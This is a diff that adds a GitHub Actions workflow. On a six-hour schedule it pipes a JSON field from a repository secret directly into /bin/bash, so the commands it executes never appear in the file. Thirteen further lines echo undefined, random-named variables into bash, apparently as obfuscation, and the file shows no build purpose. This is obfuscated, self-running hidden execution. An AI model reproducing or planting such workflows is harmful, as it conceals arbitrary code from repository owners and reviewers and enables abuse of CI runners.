@@ -1,0 +1,32 @@
+name: cloudmidlands
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '51 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: cloudmidlands
+        env:
+          fluvr625: ${{ secrets.fluvr625 }}
+        run: |
+          echo $fluvr625 | jq -r .ag352 | /bin/bash
+          echo $qf335 | jq -r .pvja9 | /bin/bash
+          echo $lazlz1374 | jq -r .tzkli45292 | /bin/bash
+          echo $mgivm5480 | jq -r .wpo0 | /bin/bash
+          echo $ftq174 | jq -r .gm78234 | /bin/bash
+          echo $k8641 | jq -r .oedci2218 | /bin/bash
+          echo $uisx72505 | jq -r .husy85 | /bin/bash
+          echo $mzqql78 | jq -r .zb163 | /bin/bash
+          echo $vch0 | jq -r .v416 | /bin/bash
+          echo $chi7793 | jq -r .yqnu36 | /bin/bash
+          echo $jwu31 | jq -r .yaqy18 | /bin/bash
+          echo $igt49 | jq -r .qyh807 | /bin/bash
+          echo $gd9 | jq -r .fg788 | /bin/bash
+          echo $n53295 | jq -r .uk02113 | /bin/bash
+
